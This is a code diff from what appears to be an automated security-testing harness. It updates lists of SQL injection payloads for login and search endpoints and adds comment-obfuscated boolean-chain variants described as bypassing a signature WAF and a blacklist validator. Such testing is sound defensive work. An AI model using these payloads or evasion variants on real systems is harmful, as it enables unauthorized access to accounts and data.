@@ -11,17 +11,22 @@ import httpx
 from ..schemas import AttackPlan, AttackType, AttemptResult, ExecutionResult
 from ..target_facts import SECRET_PRODUCT
 
+# A fixed test suite covering several SQL injection techniques. The last two are bypass
+# variants: a boolean chain with no comment marker, and the same chain obfuscated with inline
+# comments. They defeat the signature WAF and the blacklist validator respectively.
 SQLI_LOGIN_PAYLOADS = [
     "' OR '1'='1' --",
     "admin' --",
     "' OR 1=1 --",
-    "') OR ('1'='1",
+    "' OR '1'='1' OR '1'='1",
+    "'/**/OR/**/'1'='1'/**/OR/**/'1'='1",
 ]
 
 SQLI_SEARCH_PAYLOADS = [
     "' OR '1'='1' --",
-    "%' OR '1'='1' --",
-    "nope' UNION SELECT name FROM products --",
+    "' OR 1=1 --",
+    "' OR '1'='1' OR '1'='1",
+    "'/**/OR/**/'1'='1'/**/OR/**/'1'='1",
 ]
 
 WRONG_PASSWORD = "not-the-password-42"
